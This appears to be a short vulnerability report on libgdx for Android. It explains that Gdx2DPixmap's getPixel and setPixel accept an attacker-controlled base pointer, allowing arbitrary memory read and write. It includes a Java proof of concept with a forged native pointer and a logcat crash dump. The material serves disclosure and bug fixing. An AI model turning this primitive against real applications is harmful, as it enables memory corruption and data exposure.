Android libgdx memory read 

Gdx2DPixmap.java has the following method:
  public int getPixel (int x, int y) {
                return getPixel(basePtr, x, y);
        }



The problem is that we control 'basePtr', so it allows us to read a memory at arbitrary address.

The same applies to setPixel() method, which allows us to do arbitrary memory overwrite.

To test compile the following java code:

       public static void bug3() {
		int bufsize = 100;
		ByteBuffer pixelPtr = ByteBuffer.allocate(bufsize);
		for (int i = 0; i < bufsize;i++ ) pixelPtr.put((byte)0x41);

		long[] nativeData = new long[4];
		nativeData[0] = 0x01020304; // basePtr
		nativeData[1] = 0xffffffff; // Width
		nativeData[2] = 0xffffffff; // Height
		nativeData[3] = Gdx2DPixmap.GDX2D_FORMAT_RGB888;

		Pixmap p = new Pixmap(new Gdx2DPixmap(pixelPtr, nativeData));
		int pix = p.getPixel(0x41424344,0x51525354);
	}

How to test:
1) install test.apk
2) click on app icon

logcat output:

--------- beginning of crash
03-25 18:59:16.831  4235  4250 F libc    : Fatal signal 11 (SIGSEGV), code 1, fault addr 0x1020304 in tid 4250 (GLThread 185)
03-25 18:59:16.831  1247  1247 W         : debuggerd: handling request: pid=4235 uid=10091 gid=10091 tid=4250
03-25 18:59:16.836  4254  4254 F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
03-25 18:59:16.836  4254  4254 F DEBUG   : Build fingerprint: 'Android/sdk_google_phone_x86/generic_x86:7.1.1/NYC/3756122:userdebug/test-keys'
03-25 18:59:16.836  4254  4254 F DEBUG   : Revision: '0'
03-25 18:59:16.836  4254  4254 F DEBUG   : ABI: 'x86'
03-25 18:59:16.836  4254  4254 F DEBUG   : pid: 4235, tid: 4250, name: GLThread 185  >>> com.badlogicgames.superjumper.android <<<
03-25 18:59:16.836  4254  4254 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x1020304
03-25 18:59:16.837  4254  4254 F DEBUG   :     eax 51525354  ebx a5f64bb4  ecx 01020304  edx 41424344
03-25 18:59:16.837  4254  4254 F DEBUG   :     esi abeb097e  edi 51525354
03-25 18:59:16.837  4254  4254 F DEBUG   :     xcs 00000073  xds 0000007b  xes 0000007b  xfs 0000003b  xss 0000007b
03-25 18:59:16.837  4254  4254 F DEBUG   :     eip a5f2dc27  ebp a5d7dad8  esp a5d7dab0  flags 00010202
03-25 18:59:16.837  4254  4254 F DEBUG   : 
03-25 18:59:16.837  4254  4254 F DEBUG   : backtrace:
03-25 18:59:16.837  4254  4254 F DEBUG   :     #00 pc 0001bc27  /data/app/com.badlogicgames.superjumper.android-1/lib/x86/libgdx.so (gdx2d_get_pixel+39)
03-25 18:59:16.837  4254  4254 F DEBUG   :     #01 pc 00010b3e  /data/app/com.badlogicgames.superjumper.android-1/lib/x86/libgdx.so (Java_com_badlogic_gdx_graphics_g2d_Gdx2DPixmap_getPixel+46)
03-25 18:59:16.837  4254  4254 F DEBUG   :     #02 pc 002f8f32  /data/app/com.badlogicgames.superjumper.android-1/oat/x86/base.odex (offset 0x2cb000)
03-25 18:59:17.284  4254  4254 E         : debuggerd: failed to kill process 4235: No such process
